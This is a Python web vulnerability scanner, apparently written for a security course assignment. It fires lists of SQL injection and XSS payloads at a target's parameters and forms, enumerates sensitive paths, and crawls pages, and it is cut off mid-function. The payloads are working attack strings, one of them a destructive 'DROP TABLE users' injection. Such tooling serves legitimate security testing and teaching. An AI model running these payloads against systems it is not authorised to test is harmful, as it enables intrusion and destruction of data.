#!/usr/bin/env python3
"""
CA_web_vuln.py - Web Vulnerability Scanner
Comprehensive web application assessment with automation support

Features:
- SQL injection testing
- XSS vulnerability detection
- Directory enumeration
- SSL/TLS analysis
- Security headers assessment
- Target information gathering (IP/DNS/Whois/Tech)
- Recursive discovery scan (BeautifulSoup crawling)
- Results export to JSON/CSV

Author: SBA2400 James Scott
Version: 1.0.0
Dependencies: requests, beautifulsoup4, cryptography

Quick start examples:
1) Auto mode against local CA lab (default):
   python CA_web_vuln.py --auto --test

2) Auto mode against explicit target:
   python CA_web_vuln.py --auto --target http://192.168.1.100:8080

3) Manual scan types:
   python CA_web_vuln.py --url http://localhost:8080 --scan-type sql,xss,directory,ssl,headers
"""

import argparse
import json
import os
import requests
import subprocess
import sys
import time
import random
import warnings
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

# Suppress BeautifulSoup XML parsing warnings
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)


class CAWebVulnScanner:
    """
    Simplified web vulnerability scanner for CA assignment.

    This class provides basic web security testing capabilities including
    SQL injection, XSS, directory enumeration, and SSL analysis.
    """

    def __init__(
        self,
        target_url,
        output_file=None,
        encrypt_results=False,
        password=None,
        background=False,
        wordlist=None,
    ):
        """
        Initialize the web vulnerability scanner.

        Args:
            target_url (str): Target URL or IP address to scan
            output_file (str): Output file for results
            encrypt_results (bool): Whether to encrypt sensitive results
            password (str): Password for encryption
            background (bool): Run scans in background
            wordlist (str): Custom wordlist file path for directory enumeration
        """
        # Handle both URLs and IP addresses
        self.target_url = self.normalize_target(target_url)
        self.output_file = output_file
        self.encrypt_results = encrypt_results
        self.password = password or "default_password_2024"
        self.background = background
        self.wordlist = wordlist
        self.results = {
            "target_url": self.target_url,
            "scan_timestamp": datetime.now().strftime("%m/%d/%y %H:%M"),
            "background_mode": background,
            "vulnerabilities": [],
            "directory_enumeration": [],
            "ssl_analysis": {},
            "security_headers": {},
            "summary": {},
            "system_tools_used": [],
        }

        # Create output directory
        self.output_dir = "Web_Scans"
        os.makedirs(self.output_dir, exist_ok=True)

        # Enhanced SQL injection payloads
        self.sql_payloads = [
            # Basic injection
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 'x'='x",
            "1' OR '1'='1",
            "admin'--",
            "admin'#",
            # Union-based injection
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT user(),database(),version()--",
            # Error-based injection
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "'; WAITFOR DELAY '00:00:02'--",
            # Boolean-based blind injection
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            # Time-based blind injection
            "'; DROP TABLE users--",
            "' OR SLEEP(3)--",
            "' OR SLEEP(2)--",
            "' OR (SELECT SLEEP(3))--",
            # Advanced payloads
            "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' OR (SELECT COUNT(*) FROM information_schema.columns)>0--",
            "' OR (SELECT SUBSTRING(version(),1,1))='5'--",
            "' OR (SELECT SUBSTRING(user(),1,1))='r'--",
        ]

        # Enhanced XSS payloads
        self.xss_payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "javascript:alert('XSS')",
            "javascript:alert(String.fromCharCode(88,83,83))",
            # SVG XSS
            "<svg onload=alert('XSS')>",
            "<svg onload=alert(String.fromCharCode(88,83,83))>",
            "<svg><script>alert('XSS')</script></svg>",
            # Iframe XSS
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<iframe src=javascript:alert(String.fromCharCode(88,83,83))></iframe>",
            # Event handler XSS
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><img src=x onerror=alert('XSS')>",
            "\"><img src=x onerror=alert('XSS')>",
            # Filter bypass XSS
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            # DOM-based XSS
            "#<script>alert('XSS')</script>",
            "?<script>alert('XSS')</script>",
            "#javascript:alert('XSS')",
            "?javascript:alert('XSS')",
            # Advanced XSS
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            # Polyglot XSS
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            # Context-specific XSS
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "';alert('XSS');//",
            "\";alert('XSS');//",
        ]

        # Comprehensive directory/file names for enumeration
        self.directory_wordlist = [
            # Admin panels
            "admin",
            "administrator",
            "login",
            "wp-admin",
            "phpmyadmin",
            "adminer",
            "cpanel",
            "panel",
            "dashboard",
            "control",
            "manage",
            "management",
            # Common directories
            "test",
            "backup",
            "config",
            "configuration",
            "dvwa",
            "conf",
            "settings",
            "database",
            "db",
            "sql",
            "data",
            "storage",
            "files",
            "file",
            "uploads",
            "upload",
            "images",
            "img",
            "pictures",
            "pics",
            "css",
            "js",
            "javascript",
            "assets",
            "static",
            "public",
            "www",
            # API endpoints
            "api",
            "v1",
            "v2",
            "v3",
            "rest",
            "graphql",
            "soap",
            "endpoint",
            "service",
            "services",
            "ws",
            "webservice",
            # Documentation
            "docs",
            "documentation",
            "help",
            "manual",
            "guide",
            "readme",
            "changelog",
            "version",
            "versions",
            "release",
            "releases",
            # Development files
            "dev",
            "development",
            "staging",
            "test",
            "testing",
            "qa",
            "debug",
            "logs",
            "log",
            "tmp",
            "temp",
            "cache",
            "session",
            # Security files
            "robots.txt",
            "sitemap.xml",
            ".htaccess",
            "web.config",
            "crossdomain.xml",
            "security.txt",
            ".well-known",
            "favicon.ico",
            # Framework specific
            "wp-content",
            "wp-includes",
            "wp-config.php",
            "wordpress",
            "app",
            "application",
            "bin",
            "lib",
            "library",
            "vendor",
            "node_modules",
            "bower_components",
            "composer",
            "package.json",
            # Common files
            "index.php",
            "index.html",
            "index.asp",
            "index.jsp",
            "main.php",
            "home.php",
            "default.php",
            "start.php",
            "info.php",
            "phpinfo.php",
            "test.php",
            "test.html",
            # Backup files
            "backup.sql",
            "backup.zip",
            "backup.tar.gz",
            "backup.rar",
            "old",
            "bak",
            "backup",
            "backups",
            "archive",
            "archives",
            # Sensitive directories
            "private",
            "secret",
            "hidden",
            "secure",
            "protected",
            "internal",
            "system",
            "root",
            "bin",
            "sbin",
            "etc",
            "var",
            "usr",
            "home",
            "opt",
            "tmp",
            "mnt",
            "media",
        ]

    def normalize_target(self, target):
        """
        Normalize target URL or IP address.

        Args:
            target (str): Target URL or IP address

        Returns:
            str: Normalized URL
        """
        if not target.startswith(("http://", "https://")):
            # Assume it's an IP address or domain without protocol
            if "." in target and not target.startswith("www."):
                target = f"http://{target}"
            else:
                target = f"http://{target}"

        return target

    def generate_encryption_key(self, password, salt=None):
        """
        Generate encryption key from password.

        Args:
            password (str): Password to derive key from
            salt (bytes): Salt for key derivation

        Returns:
            bytes: Encryption key
        """
        if salt is None:
            salt = b"ca_web_vuln_salt_2024"

        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key

    def encrypt_data(self, data):
        """
        Encrypt sensitive data.

        Args:
            data (str): Data to encrypt

        Returns:
            dict: Encrypted data information
        """
        try:
            key = self.generate_encryption_key(self.password)
            f = Fernet(key)
            encrypted_data = f.encrypt(data.encode())

            return {
                "encrypted": True,
                "data": base64.b64encode(encrypted_data).decode(),
                "salt": base64.b64encode(b"ca_web_vuln_salt_2024").decode(),
                "algorithm": "Fernet",
                "timestamp": datetime.now().isoformat(),
            }
        except Exception as e:
            return {"encrypted": False, "error": str(e)}

    def decrypt_data(self, encrypted_info):
        """
        Decrypt sensitive data.

        Args:
            encrypted_info (dict): Encrypted data information

        Returns:
            str: Decrypted data
        """
        try:
            if not encrypted_info.get("encrypted"):
                return encrypted_info.get("data", "")

            salt = base64.b64decode(encrypted_info["salt"])
            key = self.generate_encryption_key(self.password, salt)
            f = Fernet(key)

            encrypted_data = base64.b64decode(encrypted_info["data"])
            decrypted_data = f.decrypt(encrypted_data)

            return decrypted_data.decode()
        except Exception as e:
            return f"Decryption failed: {e}"

    def test_sql_injection(self, url, parameters=None):
        """
        Test for SQL injection vulnerabilities.

        Args:
            url (str): Target URL
            parameters (dict): URL parameters to test

        Returns:
            list: List of found vulnerabilities
        """
        vulnerabilities = []
        detailed_results = {}

        try:
            # First, scrape the page to find forms and parameters
            response = requests.get(url, timeout=5, verify=False)
            soup = BeautifulSoup(response.text, "html.parser")

            # Test URL parameters
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)

            for param_name, param_values in query_params.items():
                detailed_results[param_name] = []

                # Limit payloads during recursive scans to prevent timeout (test first 5 payloads)
                max_payloads = min(5, len(self.sql_payloads))
                for payload in self.sql_payloads[:max_payloads]:
                    try:
                        # Test GET parameter with retry logic
                        test_url = url.replace(f"{param_name}={param_values[0]}", f"{param_name}={payload}")

                        # Retry logic for connection failures
                        max_retries = 2
                        retry_count = 0
                        response = None

                        while retry_count < max_retries:
                            try:
                                response = requests.get(test_url, timeout=3, allow_redirects=False, verify=False)
                                break
                            except requests.exceptions.Timeout:
                                retry_count += 1
                                if retry_count < max_retries:
                                    time.sleep(random.uniform(0.5, 1))
                                else:
                                    break  # Skip this payload on timeout
                            except Exception as e:
                                retry_count += 1
                                if retry_count < max_retries:
                                    time.sleep(random.uniform(0.5, 1))
                                else:
                                    break  # Skip this payload on error

                        # Check for SQL error patterns
                        sql_errors = [
                            "mysql_fetch_array",
                            "mysql_num_rows",
                            "mysql_query",
                            "ORA-01756",
                            "Microsoft OLE DB",
                            "SQLServer JDBC",
                            "PostgreSQL query failed",
                            "Warning: mysql_",
                            "valid MySQL result",
                            "MySqlClient\\.",
                            "SQL syntax",
                            "mysql_fetch_assoc",
                            "mysql_fetch_row",
                            "mysql error",
                            "sql error",
                            "database error",
                            "syntax error",
                            "mysql_connect",
                            "mysql_select_db",
                        ]

                        error_detected = any(error.lower() in response.text.lower() for error in sql_errors)
                        # Heuristic: consider login success indicators as auth bypass when an injection payload is used
                        success_markers = [
                            "Login Successful",
                            "Login Successful (Vulnerable Endpoint)",
                            "Login Successful (Safe Endpoint)",
                        ]
                        success_detected = any(marker in response.text for marker in success_markers)
                        evidence = "SQL error message detected" if error_detected else ("Authentication bypass detected" if success_detected else "")

                        if error_detected or success_detected:
                            vulnerabilities.append(
                                {
                                    "type": "SQL Injection",
                                    "severity": "High",
                                    "parameter": param_name,
                                    "payload": payload,
                                    "url": test_url,
                                    "method": "GET",
                                    "evidence": evidence,
                                }
                            )

                        # Store detailed test result
                        detailed_results[param_name].append(
                            {
                                "payload": payload,
                                "status_code": response.status_code,
                                "response_length": len(response.text),
                                "error_detected": error_detected,
                                "evidence": evidence,
                            }
                        )

                        # Add delay between requests to avoid overwhelming the server
                        time.sleep(random.uniform(1, 3))

                    except Exception as e:
                        detailed_results[param_name].append(
                            {"payload": payload, "status_code": "ERROR", "response_length": 0, "error_detected": False, "evidence": f"Request failed: {str(e)}"}
                        )
                        time.sleep(random.uniform(0.5, 1.5))
                        continue

            # Test form fields if available
            forms = soup.find_all("form")

            for form in forms:
                form_action = form.get("action", "")
                form_method = form.get("method", "get").lower()

                inputs = form.find_all(["input", "textarea", "select"])

                for input_field in inputs:
                    input_name = input_field.get("name", "")
                    input_type = input_field.get("type", "text")

                    if input_name and input_type in ["text", "password", "email", "search", "hidden"]:
                        if input_name not in detailed_results:
                            detailed_results[input_name] = []

                        for payload in self.sql_payloads:
                            try:
                                form_data = {input_name: payload}

                                if form_method == "post":
                                    target_url = urljoin(url, form_action) if form_action else url
                                    response = requests.post(target_url, data=form_data, timeout=10)
                                else:
                                    target_url = urljoin(url, form_action) if form_action else url
                                    response = requests.get(target_url, params=form_data, timeout=10)

                                # Check for SQL error patterns
                                sql_errors = [
                                    "mysql_fetch_array",
                                    "mysql_num_rows",
                                    "mysql_query",
                                    "ORA-01756",
                                    "Microsoft OLE DB",
                                    "SQLServer JDBC",
                                    "PostgreSQL query failed",
                                    "Warning: mysql_",
                                    "valid MySQL result",
                                    "MySqlClient\\.",
                                    "SQL syntax",
                                    "mysql_fetch_assoc",
                                    "mysql_fetch_row",
                                    "mysql error",
                                    "sql error",
                                    "database error",
                                    "syntax error",
                                    "mysql_connect",
                                    "mysql_select_db",
                                ]

                                error_detected = any(error.lower() in response.text.lower() for error in sql_errors)
                                success_markers = [
                                    "Login Successful",
                                    "Login Successful (Vulnerable Endpoint)",
                                    "Login Successful (Safe Endpoint)",
                                ]
                                success_detected = any(marker in response.text for marker in success_markers)
                                evidence = "SQL error message detected" if error_detected else ("Authentication bypass detected" if success_detected else "")

                                if error_detected or success_detected:
                                    vulnerabilities.append(
                                        {
                                            "type": "SQL Injection",
                                            "severity": "High",
                                            "parameter": input_name,
                                            "payload": payload,
                                            "url": target_url,
                                            "method": form_method.upper(),
                                            "evidence": evidence,
                                        }
                                    )

                                # Store detailed test result
                                detailed_results[input_name].append(
                                    {
                                        "payload": payload,
                                        "status_code": response.status_code,
                                        "response_length": len(response.text),
                                        "error_detected": error_detected,
                                        "evidence": evidence,
                                    }
                                )

                                # Add delay between requests
                                time.sleep(random.uniform(1, 3))

                            except Exception as e:
                                detailed_results[input_name].append(
                                    {
                                        "payload": payload,
                                        "status_code": "ERROR",
                                        "response_length": 0,
                                        "error_detected": False,
                                        "evidence": f"Request failed: {str(e)}",
                                    }
                                )
                                time.sleep(random.uniform(0.5, 1.5))
                                continue

            # Store detailed results for CSV export
            self.results["sql_injection_results"] = detailed_results

        except Exception:
            pass

        return vulnerabilities

    def test_xss_vulnerabilities(self, url, parameters=None):
        """
        Test for XSS vulnerabilities.

        Args:
            url (str): Target URL
            parameters (dict): URL parameters to test

        Returns:
            list: List of found vulnerabilities
        """
        vulnerabilities = []
        detailed_results = {}

        try:
            # First, scrape the page to find forms and parameters
            response = requests.get(url, timeout=5, verify=False)
            soup = BeautifulSoup(response.text, "html.parser")

            # Test URL parameters
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)

            for param_name, param_values in query_params.items():
                detailed_results[param_name] = []

                # Limit payloads during recursive scans to prevent timeout (test first 5 payloads)
                max_payloads = min(5, len(self.xss_payloads))
                for payload in self.xss_payloads[:max_payloads]:
                    try:
                        # Test GET parameter
                        test_url = url.replace(f"{param_name}={param_values[0]}", f"{param_name}={payload}")
                        response = requests.get(test_url, timeout=3, allow_redirects=False, verify=False)

                        # Check if payload is reflected in response (including HTML-encoded)
                        payload_encoded = payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#x27;")
                        xss_detected = payload in response.text or payload_encoded in response.text
                        evidence = "Payload reflected in response" if xss_detected else ""

                        if xss_detected:
                            vulnerabilities.append(
                                {
                                    "type": "Cross-Site Scripting (XSS)",
                                    "severity": "Medium",
                                    "parameter": param_name,
                                    "payload": payload,
                                    "url": test_url,
                                    "method": "GET",
                                    "evidence": evidence,
                                }
                            )

                        # Store detailed test result
                        detailed_results[param_name].append(
                            {
                                "payload": payload,
                                "status_code": response.status_code,
                                "response_length": len(response.text),
                                "xss_detected": xss_detected,
                                "evidence": evidence,
                            }
                        )

                        # Add delay between requests
                        time.sleep(random.uniform(0.5, 2))

                    except Exception as e:
                        detailed_results[param_name].append(
                            {"payload": payload, "status_code": "ERROR", "response_length": 0, "xss_detected": False, "evidence": f"Request failed: {str(e)}"}
                        )
                        time.sleep(random.uniform(0.5, 1))
                        continue

            # Test form fields if available
            forms = soup.find_all("form")

            for form in forms:
                form_action = form.get("action", "")
                form_method = form.get("method", "get").lower()

                inputs = form.find_all(["input", "textarea"])

                for input_field in inputs:
                    input_name = input_field.get("name", "")
                    input_type = input_field.get("type", "text")

                    if input_name and input_type in ["text", "email", "search", "hidden"]:
                        if input_name not in detailed_results:
                            detailed_results[input_name] = []

                        for payload in self.xss_payloads:
                            try:
                                form_data = {input_name: payload}

                                if form_method == "post":
                                    target_url = urljoin(url, form_action) if form_action else url
                                    response = requests.post(target_url, data=form_data, timeout=10)
                                else:
                                    target_url = urljoin(url, form_action) if form_action else url
                                    response = requests.get(target_url, params=form_data, timeout=10)

                                # Check if payload is reflected in response (including HTML-encoded)
                                payload_encoded = payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#x27;")
                                xss_detected = payload in response.text or payload_encoded in response.text
                                evidence = "Payload reflected in response" if xss_detected else ""

                                if xss_detected:
                                    vulnerabilities.append(
                                        {
                                            "type": "Cross-Site Scripting (XSS)",
                                            "severity": "Medium",
                                            "parameter": input_name,
                                            "payload": payload,
                                            "url": target_url,
                                            "method": form_method.upper(),
                                            "evidence": evidence,
                                        }
                                    )

                                # Store detailed test result
                                detailed_results[input_name].append(
                                    {
                                        "payload": payload,
                                        "status_code": response.status_code,
                                        "response_length": len(response.text),
                                        "xss_detected": xss_detected,
                                        "evidence": evidence,
                                    }
                                )

                                # Add delay between requests
                                time.sleep(random.uniform(0.5, 2))

                            except Exception as e:
                                detailed_results[input_name].append(
                                    {
                                        "payload": payload,
                                        "status_code": "ERROR",
                                        "response_length": 0,
                                        "xss_detected": False,
                                        "evidence": f"Request failed: {str(e)}",
                                    }
                                )
                                time.sleep(random.uniform(0.5, 1))
                                continue

            # Store detailed results for CSV export
            self.results["xss_testing_results"] = detailed_results

        except Exception:
            pass

        return vulnerabilities

    def enumerate_directories(self, url):
        """
        Enumerate directories and files.

        Args:
            url (str): Target URL

        Returns:
            list: List of found directories/files
        """
        found_directories = []

        try:
            # First, scrape the main page to find links and directories
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, "html.parser")

            # Extract links from the page
            links = soup.find_all("a", href=True)
            for link in links:
                href = link["href"]
                if href.startswith("/") or href.startswith("../"):
                    # Relative path
                    test_url = urljoin(url, href)
                    try:
                        dir_response = requests.get(test_url, timeout=5, allow_redirects=False)
                        if dir_response.status_code in [200, 301, 302, 403]:
                            found_directories.append(
                                {
                                    "path": href,
                                    "url": test_url,
                                    "status_code": dir_response.status_code,
                                    "size": len(dir_response.content) if dir_response.status_code == 200 else 0,
                                    "type": "file" if "." in href else "directory",
                                    "source": "page_links",
                                }
                            )
                        # Add delay between requests
                        time.sleep(random.uniform(0.3, 1))
                    except Exception:
                        time.sleep(random.uniform(0.2, 0.5))
                        continue

            # Test common directory/file names
            for directory in self.directory_wordlist:
                test_url = urljoin(url, directory)

                try:
                    response = requests.get(test_url, timeout=5, allow_redirects=False, verify=False)

                    if response.status_code == 200:
                        found_directories.append(
                            {
                                "path": directory,
                                "url": test_url,
                                "status_code": response.status_code,
                                "size": len(response.content),
                                "type": "file" if "." in directory else "directory",
                                "source": "wordlist",
                            }
                        )
                    elif response.status_code in [301, 302, 403]:
                        found_directories.append(
                            {
                                "path": directory,
                                "url": test_url,
                                "status_code": response.status_code,
                                "size": 0,
                                "type": "file" if "." in directory else "directory",
                                "source": "wordlist",
                            }
                        )

                    # Add delay between requests
                    time.sleep(random.uniform(0.2, 0.8))

                except requests.exceptions.Timeout:
                    # Timeout - skip this directory
                    continue
                except requests.exceptions.RequestException:
                    # Connection errors - skip this directory
                    continue
                except Exception:
                    # Other exceptions - skip this directory
                    continue

            # Remove duplicates based on URL
            seen_urls = set()
            unique_directories = []
            for item in found_directories:
                if item["url"] not in seen_urls:
                    seen_urls.add(item["url"])
                    unique_directories.append(item)

            found_directories = unique_directories

        except Exception:
            pass

        return found_directories

    def deep_scrape_discovered_paths(self, discovered_paths):
        """
        Deep scrape all discovered paths to find additional information.

        Args:
            discovered_paths (list): List of discovered paths from directory enumeration

        Returns:
            dict: Additional information found through deep scraping
        """
        deep_scrape_results = {"additional_paths": [], "forms_found": [], "parameters_found": [], "technologies_detected": [], "vulnerabilities_found": []}

        try:
            for path_info in discovered_paths:
                if path_info["status_code"] == 200:  # Only scrape accessible pages
                    try:
                        response = requests.get(path_info["url"], timeout=5, verify=False)
                        soup = BeautifulSoup(response.text, "html.parser")

                        # Extract additional links
                        links = soup.find_all("a", href=True)
                        for link in links:
                            href = link["href"]
                            if href.startswith("/") or href.startswith("../"):
                                additional_url = urljoin(path_info["url"], href)
                                if additional_url not in [p["url"] for p in discovered_paths]:
                                    deep_scrape_results["additional_paths"].append(
                                        {"path": href, "url": additional_url, "source_page": path_info["url"], "status_code": "not_tested"}
                                    )

                        # Extract forms
                        forms = soup.find_all("form")
                        for form in forms:
                            form_info = {"action": form.get("action", ""), "method": form.get("method", "get"), "page": path_info["url"], "inputs": []}

                            inputs = form.find_all(["input", "textarea", "select"])
                            for input_field in inputs:
                                input_info = {
                                    "name": input_field.get("name", ""),
                                    "type": input_field.get("type", "text"),
                                    "id": input_field.get("id", ""),
                                    "placeholder": input_field.get("placeholder", ""),
                                }
                                form_info["inputs"].append(input_info)

                            deep_scrape_results["forms_found"].append(form_info)

                        # Extract URL parameters
                        parsed_url = urlparse(path_info["url"])
                        query_params = parse_qs(parsed_url.query)
                        for param_name, param_values in query_params.items():
                            deep_scrape_results["parameters_found"].append({"parameter": param_name, "values": param_values, "page": path_info["url"]})

                        # Detect technologies
                        tech_indicators = {
                            "WordPress": ["wp-content", "wp-includes", "wordpress"],
                            "Drupal": ["sites/default", "drupal", "modules"],
                            "Joomla": ["joomla", "components", "modules"],
                            "PHP": ["<?php", ".php", "phpinfo"],
                            "ASP.NET": ["__VIEWSTATE", "asp.net", ".aspx"],
                            "JavaScript": ["jquery", "angular", "react", "vue"],
                            "Bootstrap": ["bootstrap", "btn-", "col-"],
                            "jQuery": ["jquery", "$("],
                        }

                        page_content = response.text.lower()
                        for tech, indicators in tech_indicators.items():
                            if any(indicator in page_content for indicator in indicators):
                                if tech not in deep_scrape_results["technologies_detected"]:
                                    deep_scrape_results["technologies_detected"].append(tech)

                        # Look for common vulnerability indicators
                        vuln_indicators = {
                            "SQL Injection": ["mysql_fetch", "sql error", "database error"],
                            "XSS": ["<script>", "javascript:", "onerror="],
                            "File Upload": ["upload", "file", "multipart/form-data"],
                            "Admin Panel": ["admin", "administrator", "login", "dashboard"],
                            "Debug Mode": ["debug", "test", "development", "phpinfo"],
                            "Sensitive Files": [".env", "config", "backup", ".bak"],
                        }

                        for vuln_type, indicators in vuln_indicators.items():
                            if any(indicator in page_content for indicator in indicators):
                                deep_scrape_results["vulnerabilities_found"].append(
                                    {"type": vuln_type, "page": path_info["url"], "indicators": [ind for ind in indicators if ind in page_content]}
                                )

                    except Exception:
                        continue

        except Exception:
            pass

        return deep_scrape_results

    def recursive_path_discovery(self, initial_url, max_depth=3, visited_urls=None):
        """
        Recursively discover and scan new paths found through BeautifulSoup scraping.

        Args:
            initial_url (str): Starting URL for recursive discovery
            max_depth (int): Maximum recursion depth
            visited_urls (set): Set of already visited URLs

        Returns:
            dict: Recursive scan results
        """
        if visited_urls is None:
            visited_urls = set()

        recursive_results = {
            "discovered_paths": [],
            "vulnerabilities_found": [],
            "forms_discovered": [],
            "parameters_discovered": [],
            "scan_depth": 0,
            "total_urls_scanned": 0,
        }

        try:
            # Queue for BFS traversal
            url_queue = [(initial_url, 0)]  # (url, depth)

            while url_queue and len(visited_urls) < 50:  # Limit to prevent infinite loops
                current_url, depth = url_queue.pop(0)

                if current_url in visited_urls or depth > max_depth:
                    continue

                visited_urls.add(current_url)
                recursive_results["total_urls_scanned"] += 1
                recursive_results["scan_depth"] = max(recursive_results["scan_depth"], depth)

                print(f"[INFO] Recursive scan depth {depth}: {current_url}")

                try:
                    # Get page content
                    response = requests.get(current_url, timeout=5, verify=False)
                    soup = BeautifulSoup(response.text, "html.parser")

                    # Extract all links
                    links = soup.find_all("a", href=True)
                    new_paths = []

                    for link in links:
                        href = link["href"]

                        # Convert relative URLs to absolute
                        if href.startswith("/") or href.startswith("../"):
                            absolute_url = urljoin(current_url, href)
                        elif href.startswith("http"):
                            absolute_url = href
                        else:
                            continue

                        # Only process URLs from the same domain
                        if urlparse(absolute_url).netloc == urlparse(initial_url).netloc:
                            if absolute_url not in visited_urls:
                                new_paths.append(absolute_url)
                                recursive_results["discovered_paths"].append(
                                    {"url": absolute_url, "source_url": current_url, "depth": depth + 1, "link_text": link.get_text().strip()[:50]}
                                )

                    # Test for vulnerabilities on current page (once per page, not per link)
                    print(f"[INFO] Testing vulnerabilities on: {current_url}")

                    # Retry logic for connection failures
                    max_retries = 3
                    retry_count = 0

                    while retry_count < max_retries:
                        try:
                            # Test connection first
                            requests.get(current_url, timeout=5, verify=False)
                            break
                        except requests.exceptions.Timeout:
                            retry_count += 1
                            if retry_count < max_retries:
                                time.sleep(random.uniform(1, 2))
                            else:
                                print(f"[WARNING] Timeout connecting to {current_url} - skipping")
                                break
                        except Exception as e:
                            retry_count += 1
                            if retry_count < max_retries:
                                time.sleep(random.uniform(1, 2))
                            else:
                                print(f"[WARNING] Failed to connect after {max_retries} attempts: {e}")
                                break

                    if retry_count < max_retries:
                        # Skip vulnerability testing during recursive scans to prevent timeout
                        # Vulnerability testing is already done on the main page in non-recursive mode
                        # Recursive scan focuses on discovery, not deep testing of every page
                        print(f"[INFO] Page loaded successfully: {current_url} (skipping deep vulnerability tests in recursive mode)")

                        # Directory enumeration on discovered paths (limit to avoid timeout)
                        # Only enumerate on first few paths per depth to prevent timeout
                        if len(recursive_results["discovered_paths"]) < 50:  # Limit total enumerated paths
                            try:
                                dir_results = self.enumerate_directories(current_url)
                                for dir_item in dir_results[:5]:  # Limit directories per path
                                    dir_item["discovered_url"] = current_url
                                    dir_item["discovery_depth"] = depth
                                    recursive_results["discovered_paths"].append(dir_item)
                            except Exception as e:
                                # Skip if enumeration fails
                                pass

                        # Security headers analysis on discovered paths
                        try:
                            headers_analysis = self.analyze_security_headers()
                            if headers_analysis["vulnerabilities"]:
                                for vuln in headers_analysis["vulnerabilities"]:
                                    vuln["discovered_url"] = current_url
                                    vuln["discovery_depth"] = depth
                                    recursive_results["vulnerabilities_found"].append(vuln)
                        except Exception as e:
                            print(f"[WARNING] Header analysis failed for {current_url}: {e}")

                    # Extract forms
                    forms = soup.find_all("form")
                    for form in forms:
                        form_info = {"url": current_url, "action": form.get("action", ""), "method": form.get("method", "get"), "depth": depth, "inputs": []}

                        inputs = form.find_all(["input", "textarea", "select"])
                        for input_field in inputs:
                            input_info = {
                                "name": input_field.get("name", ""),
                                "type": input_field.get("type", "text"),
                                "id": input_field.get("id", ""),
                                "placeholder": input_field.get("placeholder", ""),
                            }
                            form_info["inputs"].append(input_info)

                        recursive_results["forms_discovered"].append(form_info)

                    # Extract URL parameters
                    parsed_url = urlparse(current_url)
                    query_params = parse_qs(parsed_url.query)
                    for param_name, param_values in query_params.items():
                        recursive_results["parameters_discovered"].append({"parameter": param_name, "values": param_values, "url": current_url, "depth": depth})

                    # Add new paths to queue for next depth level
                    if depth < max_depth:
                        for new_path in new_paths[:10]:  # Limit new paths per level
                            if new_path not in visited_urls:
                                url_queue.append((new_path, depth + 1))

                    print(f"[INFO] Discovered {len(new_paths)} new paths at depth {depth}")

                except Exception as e:
                    print(f"[WARNING] Error scanning {current_url}: {e}")
                    continue

            print("[INFO] Recursive scan completed:")
            print(f"  - Total URLs scanned: {recursive_results['total_urls_scanned']}")
            print(f"  - Maximum depth reached: {recursive_results['scan_depth']}")
            print(f"  - New paths discovered: {len(recursive_results['discovered_paths'])}")
            print(f"  - Vulnerabilities found: {len(recursive_results['vulnerabilities_found'])}")
            print(f"  - Forms discovered: {len(recursive_results['forms_discovered'])}")
            print(f"  - Parameters discovered: {len(recursive_results['parameters_discovered'])}")

        except Exception as e:
            print(f"[ERROR] Recursive scan failed: {e}")

        return recursive_results

    def gather_target_information(self):
        """
        Gather comprehensive target information including OS, IP, DNS, etc.

        Returns:
            dict: Target information including OS, IP, DNS, technologies
        """
        target_info = {
            "ip_address": None,
            "dns_records": {},
            "os_detection": {},
            "server_info": {},
            "technologies": [],
            "ports_open": [],
            "subdomains": [],
            "whois_info": {},
        }

        try:
            parsed_url = urlparse(self.target_url)
            hostname = parsed_url.hostname

            if hostname:
                # Get IP address
                try:
                    import socket

                    ip_address = socket.gethostbyname(hostname)
                    target_info["ip_address"] = ip_address
                except Exception as e:
                    target_info["ip_address"] = f"Unable to resolve: {e}"

                # DNS Records using dig
                try:
                    dns_records = {}

                    # A record
                    try:
                        dig_cmd = ["dig", "+short", hostname, "A"]
                        dig_result = subprocess.run(dig_cmd, capture_output=True, text=True, timeout=10)
                        if dig_result.returncode == 0 and dig_result.stdout.strip():
